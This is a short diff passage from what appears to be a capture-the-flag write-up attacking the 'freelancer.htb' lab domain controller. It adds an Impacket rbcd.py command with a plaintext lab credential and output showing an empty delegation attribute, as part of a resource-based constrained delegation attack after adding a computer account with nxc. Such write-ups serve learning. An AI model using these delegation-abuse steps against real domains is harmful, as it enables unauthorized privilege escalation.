@@ -701,7 +701,14 @@ ADD-COMP... 10.129.66.164   445    DC               Successfully added the machi
 
 First ill use nxc to add a computer account
 
+```python
+rbcd.py -delegate-to "DC$" -dc-ip 10.129.66.164 -action 'read' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+```
+
+As seen here the attribute is 
 
 
 
